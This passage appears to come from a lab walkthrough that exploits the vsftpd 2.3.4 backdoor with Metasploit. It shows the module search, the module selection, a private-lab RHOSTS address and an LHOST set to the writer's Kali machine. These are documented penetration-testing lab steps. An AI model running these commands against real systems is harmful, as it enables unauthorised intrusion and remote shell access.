...
3. Searched for the exploit: `search vsftpd`
...
4. Selected module: `use exploit/unix/ftp/vsftpd_234_backdoor`   
5. Set target: `set RHOSTS 192.168.100.150`

<img width="1920" height="936" alt="rhosts" src="https://github.com/user-attachments/assets/0b9d21b0-929f-4735-9cec-5c53519246f8" />

6. Set local host: `set LHOST [my Kali IP]`
